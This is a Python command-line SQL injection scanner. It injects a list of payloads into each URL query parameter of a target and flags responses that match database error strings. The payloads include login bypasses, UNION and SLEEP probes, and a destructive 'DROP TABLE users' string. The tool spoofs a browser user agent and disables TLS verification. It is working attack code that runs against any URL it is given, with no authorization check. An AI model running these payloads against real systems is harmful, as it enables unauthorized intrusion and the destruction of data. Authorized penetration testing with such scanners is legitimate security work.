"""
SQL injection scanner module.

Error-based SQLi detection across URL parameters.
Ships with a curated payload set and error-signature list covering
MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
"""

from __future__ import annotations

import json
from argparse import ArgumentParser
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode

import requests


PAYLOADS: tuple[str, ...] = (
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "1' AND 1=1--",
    "1' AND SLEEP(5)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "') OR ('1'='1",
    "'; DROP TABLE users--",
    "admin'--",
    "1' ORDER BY 100--",
)

ERROR_SIGNATURES: tuple[str, ...] = (
    "sql syntax",
    "mysql_fetch",
    "mysqli_",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "ora-01756",
    "ora-00933",
    "oracle error",
    "postgresql query failed",
    "pg_query",
    "psql:",
    "sqlite3.operationalerror",
    "sqlite error",
    "sqlstate",
    "native client",
)


class SQLiScanner:
    """
    Error-based SQL injection scanner.

    Example:
        s = SQLiScanner("http://target/page.php?id=1")
        print(s.scan())
    """

    def __init__(self, url: str, timeout: float = 8.0, verify_ssl: bool = False) -> None:
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0 Safari/537.36"
            )
        })
        self.session.verify = verify_ssl

    def _inject(self, param: str, payload: str) -> tuple[str, str]:
        """Return (test_url, response_body)."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        r = self.session.get(test_url, timeout=self.timeout)
        return test_url, r.text

    def scan(self) -> list[dict[str, Any]]:
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        if not params:
            return [{"error": "no query parameters in URL"}]

        findings: list[dict[str, Any]] = []
        for param in params:
            for payload in PAYLOADS:
                try:
                    test_url, body = self._inject(param, payload)
                except Exception:
                    continue
                low = body.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in low:
                        finding = {
                            "param": param,
                            "payload": payload,
                            "signature": sig,
                            "url": test_url,
                        }
                        findings.append(finding)
                        print(f"[!] SQLi on '{param}' :: {payload}  ({sig})")
                        break
        return findings

    def pretty(self, findings: list[dict[str, Any]]) -> str:
        bar = "=" * 56
        lines = [bar, f"  SQLi Scan :: {self.url}",
                 f"  Hits: {len(findings)}", bar]
        for f in findings:
            if "error" in f:
                lines.append("  " + f["error"])
                continue
            lines.append(f"  param={f['param']}  sig='{f['signature']}'")
            lines.append(f"      payload: {f['payload']}")
        return "\n".join(lines)


def main() -> None:
    p = ArgumentParser(description="SQL injection scanner (error-based)")
    p.add_argument("url", help="target URL with query string, e.g. http://x/y?id=1")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--json", action="store_true")
    args = p.parse_args()

    s = SQLiScanner(args.url, timeout=args.timeout)
    findings = s.scan()

    if args.json:
        print(json.dumps(findings, indent=2))
    else:
        print(s.pretty(findings))


if __name__ == "__main__":
    main()
